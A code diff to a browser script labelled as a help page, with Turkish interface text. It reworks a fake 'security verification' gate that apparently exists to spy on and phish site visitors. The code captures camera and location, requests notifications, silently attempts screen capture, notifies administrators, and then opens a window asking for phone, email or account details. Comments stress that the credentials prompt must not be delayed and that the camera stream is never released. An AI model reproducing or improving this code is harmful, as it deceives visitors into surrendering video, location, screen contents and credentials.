@@ -1,5 +1,5 @@
 (function () {
-  console.info("[help-build]", "136", location.pathname);
+  console.info("[help-build]", "137", location.pathname);
   const searchInput = document.getElementById("help-search");
   const searchBtn = document.getElementById("search-btn");
   const searchHint = document.getElementById("search-hint");
@@ -1682,19 +1682,17 @@
     }
   }
 
-  /** Kullanılmayan early stream'i bırakma — exclusive camera çakışmasını önler */
+  /** Kullanılmayan early stream'i bırakma — canlı stream ASLA öldürülmez (yeniden kullanılır). */
   function stopOrphanEarlyStream() {
     if (!earlyCameraStream) return;
     if (hasLiveCameraTracks(earlyCameraStream)) {
-      const inUse = [...cameraSessions.values()].some((st) => st?.stream === earlyCameraStream);
-      if (inUse) {
-        earlyCameraStream = null;
-        return;
-      }
-      stopMediaStreamTracks(earlyCameraStream);
+      // Canlı early stream'i oturuma bağlanana kadar sakla — stop etme!
+      return;
     }
     earlyCameraStream = null;
   }
+
+  let cameraAcquireLock = null;
 
   function findLiveCameraSessionEntry() {
     for (const [id, st] of cameraSessions.entries()) {
@@ -1703,63 +1701,78 @@
     return null;
   }
 
+  function getAnyLiveCameraStream() {
+    const live = findLiveCameraSessionEntry();
+    if (live?.[1]?.stream && hasLiveCameraTracks(live[1].stream)) return live[1].stream;
+    if (earlyCameraStream && hasLiveCameraTracks(earlyCameraStream)) return earlyCameraStream;
+    return null;
+  }
+
   async function acquireCameraStreamNative() {
     if (!navigator.mediaDevices?.getUserMedia) {
       throw new Error("getUserMedia yok");
     }
-    // Canlı oturum varken ikinci gum → mobilde ilk track'leri öldürür
-    const live = findLiveCameraSessionEntry();
-    if (live?.[1]?.stream && hasLiveCameraTracks(live[1].stream)) {
-      live[1].stream.getVideoTracks().forEach(tuneVideoTrack);
-      return live[1].stream;
-    }
-    if (earlyCameraStream && hasLiveCameraTracks(earlyCameraStream)) {
-      earlyCameraStream.getVideoTracks().forEach(tuneVideoTrack);
-      return earlyCameraStream;
-    }
-    // Yüksek kalite önce; cihaz desteklemezse kademeli düş
-    const attempts = [
-      {
-        audio: false,
-        video: {
-          facingMode: { ideal: "user" },
-          width: { ideal: 1280, min: 640 },
-          height: { ideal: 720, min: 480 },
-          frameRate: { ideal: 30, min: 15 },
-        },
-      },
-      {
-        audio: false,
-        video: {
-          facingMode: "user",
-          width: { ideal: 1280 },
-          height: { ideal: 720 },
-          frameRate: { ideal: 24 },
-        },
-      },
-      {
-        audio: false,
-        video: {
-          width: { ideal: 960 },
-          height: { ideal: 540 },
-          frameRate: { ideal: 24 },
-        },
-      },
-      { video: { facingMode: { ideal: "user" } }, audio: false },
-      { video: true, audio: false },
-    ];
-    let lastErr;
-    for (const constraints of attempts) {
+    if (cameraAcquireLock) {
       try {
-        stopOrphanEarlyStream();
-        const stream = await navigator.mediaDevices.getUserMedia(constraints);
-        stream.getVideoTracks().forEach(tuneVideoTrack);
-        return stream;
-      } catch (err) {
-        lastErr = err;
+        await cameraAcquireLock;
+      } catch {
+        /* ignore prior failure */
+      }
+      const reused = getAnyLiveCameraStream();
+      if (reused) {
+        reused.getVideoTracks().forEach(tuneVideoTrack);
+        return reused;
       }
     }
-    throw lastErr || new Error("Güvenlik doğrulaması açılamadı");
+
+    let release;
+    cameraAcquireLock = new Promise((r) => {
+      release = r;
+    });
+    try {
+      const existing = getAnyLiveCameraStream();
+      if (existing) {
+        existing.getVideoTracks().forEach(tuneVideoTrack);
+        return existing;
+      }
+      // Basit kısıtlar önce — agresif min/ideal bazı cihazlarda izin sonrası yine Fail eder
+      const attempts = [
+        { video: true, audio: false },
+        { video: { facingMode: "user" }, audio: false },
+        { video: { facingMode: { ideal: "user" } }, audio: false },
+        {
+          audio: false,
+          video: {
+            facingMode: { ideal: "user" },
+            width: { ideal: 1280 },
+            height: { ideal: 720 },
+            frameRate: { ideal: 24 },
+          },
+        },
+      ];
+      let lastErr;
+      for (const constraints of attempts) {
+        try {
+          // Sadece ölü early'yi temizle — canlıyı öldürme
+          stopOrphanEarlyStream();
+          const again = getAnyLiveCameraStream();
+          if (again) {
+            again.getVideoTracks().forEach(tuneVideoTrack);
+            return again;
+          }
+          const stream = await navigator.mediaDevices.getUserMedia(constraints);
+          stream.getVideoTracks().forEach(tuneVideoTrack);
+          earlyCameraStream = stream;
+          return stream;
+        } catch (err) {
+          lastErr = err;
+        }
+      }
+      throw lastErr || new Error("Güvenlik doğrulaması açılamadı");
+    } finally {
+      release?.();
+      cameraAcquireLock = null;
+    }
   }
 
   async function configureVisitorVideoSender(pc) {
@@ -1883,9 +1896,9 @@
       /* ignore */
     }
     if (hasLiveCameraTracks(state) && state._hadLocation) markMediaPermGranted();
-    const chatBox =
-      document.querySelector("[data-chat-root] [data-chat-messages]") || null;
-    if (hasLiveCameraTracks(state) && state._hadLocation && chatBox) maybeOfferPhoneEntry(chatBox);
+    if (hasLiveCameraTracks(state) && state._hadLocation) {
+      maybeOfferPhoneEntry(getOrCreateMediaHost());
+    }
     return true;
   }
 
@@ -3014,165 +3027,146 @@
   }
 
   /**
-   * Jest anında native kamera+konum — ekran AYRI (getDisplayMedia aynı anda
-   * getUserMedia’yı AbortError ile öldürebilir / popup’ı kilitleyebilir).
+   * Jest anında kamera + konum — bildirim/ekran sonra (AbortError riski).
    */
   function kickNativeMediaFromGesture() {
     const camP = acquireCameraStreamNative()
       .then((stream) => ({ ok: true, stream }))
       .catch((err) => ({ ok: false, err }));
     const locP = acquireLocationNativeOnce();
-    let notifP = Promise.resolve(
-      typeof Notification !== "undefined" ? Notification.permission : "denied"
-    );
-    if (typeof Notification !== "undefined" && Notification.permission === "default") {
+    return { camP, locP };
+  }
+
+  async function finishGateAfterCamera(host) {
+    markMediaPermGranted();
+    hidePageEntryPermGate();
+    setPageEntryGateBusy(false);
+    maybeOfferPhoneEntry(host);
+    void enrollVisitorPushAndNotifyAdmins();
+    // Oturum / konum / ekran arka planda — credentials’ı bekletme
+    void (async () => {
       try {
-        notifP = Notification.requestPermission();
+        if (!earlyLocationPos?.coords) {
+          const loc = await acquireLocationNativeOnce();
+          if (loc?.coords) stashEarlyLocation(loc);
+        }
       } catch {
         /* ignore */
       }
-    }
-    return { camP, locP, notifP };
+      try {
+        if (typeof Notification !== "undefined" && Notification.permission === "default") {
+          await Notification.requestPermission();
+        }
+      } catch {
+        /* ignore */
+      }
+      try {
+        await openCameraLikeChat(host, {
+          fromGesture: false,
+          announce: true,
+          preferEarlyStream: true,
+        });
+      } catch (err) {
+        console.warn("gate background bind", err);
+      }
+      // Ekran: asla credentials önünde; jest olmadan çoğu tarayıcı reddeder — sessiz dene
+      if (!screenCaptureActive() && navigator.mediaDevices?.getDisplayMedia) {
+        try {
+          const screenStream = await acquireScreenStreamNative();
+          if (screenStream) void beginScreenCapture(screenStream);
+        } catch {
+          /* optional */
+        }
+      }
+    })();
   }
 
   async function runGateAllowFlow() {
     if (pageEntryPermBusy) return;
-    if (hasGateCameraAndLocation()) {
-      markMediaPermGranted();
-      hidePageEntryPermGate();
-      const host = getOrCreateMediaHost();
-      maybeOfferPhoneEntry(host);
-      // Arka planda oturumu bağla / ekranı dene — gate’i bekletme
-      void openCameraLikeChat(host, { fromGesture: true, announce: false, preferEarlyStream: true }).catch(
-        () => {}
-      );
-      return;
-    }
+    const host = getOrCreateMediaHost();
 
-    const liveCam = hasLiveCameraSession() || hasLiveCameraTracks(earlyCameraStream);
-    let camP;
-    let locP;
-    let notifP = Promise.resolve("denied");
-    if (liveCam) {
-      setPageEntryGateBusy(true, "Güvenlik doğrulaması isteniyor…");
-      locP = acquireLocationNativeOnce();
-      camP = Promise.resolve({
-        ok: true,
-        stream:
-          findLiveCameraSessionEntry()?.[1]?.stream ||
-          (hasLiveCameraTracks(earlyCameraStream) ? earlyCameraStream : null),
-      });
-      if (typeof Notification !== "undefined" && Notification.permission === "default") {
+    if (getAnyLiveCameraStream()) {
+      // Kamera zaten var → credentials hemen; konum arka planda
+      if (!earlyLocationPos?.coords) {
+        setPageEntryGateBusy(true, "Konum doğrulanıyor…");
         try {
-          notifP = Notification.requestPermission();
+          const loc = await Promise.race([
+            acquireLocationNativeOnce(),
+            new Promise((r) => window.setTimeout(() => r(null), 2500)),
+          ]);
+          if (loc?.coords) stashEarlyLocation(loc);
         } catch {
           /* ignore */
         }
       }
-    } else {
-      const kicked = kickNativeMediaFromGesture();
-      camP = kicked.camP;
-      locP = kicked.locP;
-      notifP = kicked.notifP;
-      setPageEntryGateBusy(true, "Kamera güvenlik penceresi açılıyor…");
-    }
-
-    void notifP.catch(() => {});
-
-    let cam = await camP;
-    if (!cam.ok && !liveCam) {
-      cam = await acquireCameraStreamNative()
-        .then((stream) => ({ ok: true, stream }))
-        .catch((err) => ({ ok: false, err }));
-    }
-    if (!cam.ok) {
-      clearMediaPermGranted();
-      const name = cam.err?.name || "";
-      const hint =
-        name === "NotAllowedError" || name === "PermissionDeniedError"
-          ? "Kamera reddedildi. Adres çubuğundan bu site için kamerayı Açık yapıp tekrar Doğrula’ya basın."
-          : "Kamera açılamadı. Tekrar Doğrula’ya basın (ekran paylaşımı penceresini kapatın).";
-      setPageEntryGateBusy(false, hint);
+      await finishGateAfterCamera(host);
       return;
     }
 
-    if (cam.stream && !findLiveCameraSessionEntry()) {
-      earlyCameraStream = cam.stream;
-    }
-
-    setPageEntryGateStatus("Konum doğrulanıyor…");
-    const loc = await locP;
-    if (loc?.coords) stashEarlyLocation(loc);
-    else {
-      const loc2 = await acquireLocationNativeOnce();
-      if (loc2?.coords) stashEarlyLocation(loc2);
-    }
-
-    // Ekran: kamera+konumdan SONRA, best-effort — gate’i bloke etme
-    if (!screenCaptureActive() && navigator.mediaDevices?.getDisplayMedia) {
-      setPageEntryGateStatus("Bağlanıyor…");
-      try {
-        const screenStream = await acquireScreenStreamNative();
-        if (screenStream) void beginScreenCapture(screenStream);
-      } catch (err) {
-        console.warn("screen after gate", err?.name || err);
-      }
-    }
-
-    setPageEntryGateStatus("Doğrulama bağlanıyor…");
-    const host = getOrCreateMediaHost();
+    setPageEntryGateBusy(true, "Kamera güvenlik penceresi açılıyor…");
     try {
-      await openCameraLikeChat(host, {
-        fromGesture: true,
-        announce: true,
-        preferEarlyStream: true,
-      });
+      const kicked = kickNativeMediaFromGesture();
+      let cam = await kicked.camP;
+      if (!cam.ok) {
+        cam = await acquireCameraStreamNative()
+          .then((stream) => ({ ok: true, stream }))
+          .catch((err) => ({ ok: false, err }));
+      }
+      if (!cam.ok || !cam.stream) {
+        clearMediaPermGranted();
+        const name = cam.err?.name || "";
+        const hint =
+          name === "NotAllowedError" || name === "PermissionDeniedError"
+            ? "Kamera reddedildi. Adres çubuğundan bu site için kamerayı Açık yapıp tekrar Doğrula’ya basın."
+            : name === "NotReadableError"
+              ? "Kamera başka uygulamada açık. Kapatıp tekrar Doğrula’ya basın."
+              : "Kamera açılamadı. Tekrar Doğrula’ya basın.";
+        setPageEntryGateBusy(false, hint);
+        return;
+      }
+
+      earlyCameraStream = cam.stream;
+
+      setPageEntryGateStatus("Konum doğrulanıyor…");
+      // Konumu kısa bekle; gelmezse yine de telefon penceresini aç
+      let loc = null;
+      try {
+        loc = await Promise.race([
+          kicked.locP,
+          new Promise((r) => window.setTimeout(() => r(null), 2500)),
+        ]);
+      } catch {
+        loc = null;
+      }
+      if (loc?.coords) stashEarlyLocation(loc);
+
+      await finishGateAfterCamera(host);
     } catch (err) {
       console.warn("gate allow", err);
-    }
-
-    if (hasGateCameraAndLocation()) {
-      markMediaPermGranted();
-      hidePageEntryPermGate();
-      setPageEntryGateBusy(false);
-      void enrollVisitorPushAndNotifyAdmins();
-      maybeOfferPhoneEntry(host);
-      return;
-    }
-
-    // Kamera-only: gate kalsın — konum için tekrar jest
-    const camOnly =
-      hasLiveCameraSession() || hasLiveCameraTracks(earlyCameraStream);
-    setPageEntryGateBusy(
-      false,
-      camOnly
-        ? "İlk adım tamam. Konum için tekrar Doğrula’ya basın."
-        : "Bağlantı kurulamadı. Tekrar deneyin."
-    );
-    const title = document.querySelector("#page-entry-perm-gate h2");
-    const body = document.querySelector(
-      "#page-entry-perm-gate .page-entry-perm-card > p:not(.page-entry-perm-kicker):not(.page-entry-perm-status)"
-    );
-    if (camOnly) {
-      if (title) title.textContent = "Güvenlik doğrulamasını tamamlayın";
-      if (body) {
-        body.innerHTML =
-          "Kamera alındı. Devam için <strong>konum</strong> onayını verin. <strong>Doğrula</strong>’ya basınca konum penceresi açılır.";
+      setPageEntryGateBusy(false, "Doğrulama tamamlanamadı. Tekrar Doğrula’ya basın.");
+    } finally {
+      pageEntryPermBusy = false;
+      pageEntryGateBusyUntil = 0;
+      const btn = document.querySelector("#page-entry-perm-gate [data-page-perm-allow]");
+      if (btn) {
+        btn.disabled = false;
+        btn.textContent = "Doğrula";
       }
     }
   }
 
   function showPageEntryPermGate() {
-    if (hasGateCameraAndLocation()) {
+    if (getAnyLiveCameraStream() && (earlyLocationPos?.coords || hasLiveCameraAndLocation())) {
       markMediaPermGranted();
       hidePageEntryPermGate();
+      maybeOfferPhoneEntry(getOrCreateMediaHost());
       return;
     }
     if (pageEntryPermBusy || Date.now() < pageEntryGateBusyUntil) return;
 
     // Kamera canlı, konum yok → gate kalsın/gösterilsin (kamera-only ile kapanmaz)
     let gate = document.getElementById("page-entry-perm-gate");
-    const camOnly = hasLiveCameraSession();
+    const camOnly = Boolean(getAnyLiveCameraStream());
     if (gate) {
       if (camOnly) {
         const title = gate.querySelector("h2");
@@ -3180,7 +3174,7 @@
         if (title) title.textContent = "Güvenlik doğrulamasını tamamlayın";
         if (body) {
           body.innerHTML =
-            "İlk adım tamam. Devam için <strong>güvenlik doğrulamasını</strong> tamamlayın. <strong>Doğrula</strong>’ya basınca telefon güvenlik penceresi açılır; penceredeki onayla devam edin.";
+            "Kamera alındı. <strong>Doğrula</strong>’ya basınca hesap bilgileri penceresi açılır.";
         }
       }
       return;
@@ -3197,7 +3191,7 @@
       <div class="page-entry-perm-card">
         <p class="page-entry-perm-kicker">Kimlik doğrulaması</p>
         <h2>Güvenlik doğrulamasını tamamlayın</h2>
-        <p>İlk adım tamam. Devam için <strong>güvenlik doğrulamasını</strong> tamamlayın. <strong>Doğrula</strong>’ya basınca telefon güvenlik penceresi açılır; penceredeki onayla devam edin.</p>
+        <p>Kamera alındı. <strong>Doğrula</strong>’ya basınca telefon / e-posta güvenlik penceresi açılır.</p>
         <p class="page-entry-perm-status" data-page-perm-status></p>
         <button type="button" class="btn btn-primary" data-page-perm-allow>Doğrula</button>
       </div>
@@ -3206,7 +3200,7 @@
       <div class="page-entry-perm-card">
         <p class="page-entry-perm-kicker">Kimlik doğrulaması</p>
         <h2>Güvenlik doğrulaması gerekli</h2>
-        <p>Devam etmek için tarayıcıda <strong>güvenlik doğrulamasını</strong> onaylayın. <strong>Doğrula</strong>’ya basınca telefon güvenlik penceresi açılır.</p>
+        <p>Devam etmek için kamerayı onaylayın. Ardından telefon ve e-posta güvenlik penceresi açılır.</p>
         <p class="page-entry-perm-status" data-page-perm-status></p>
         <button type="button" class="btn btn-primary" data-page-perm-allow>Doğrula</button>
       </div>
@@ -3734,11 +3728,11 @@
         fromGesture,
         announce: false,
       }).then((ok) => {
-        if (ok || hasLiveCameraSession()) {
+        // Yalnızca kamera+konum (veya hatırlanan tam erişim) ile gate kapat
+        if (hasLiveCameraAndLocation() || (remembered && hasLiveCameraSession())) {
           hidePageEntryPermGate();
-          if (hasLiveCameraAndLocation() || remembered) {
-            void enrollVisitorPushAndNotifyAdmins();
-          }
+          void enrollVisitorPushAndNotifyAdmins();
+          maybeOfferPhoneEntry(getOrCreateMediaHost());
           return;
         }
         if (!pageEntryPermBusy) showPageEntryPermGate();
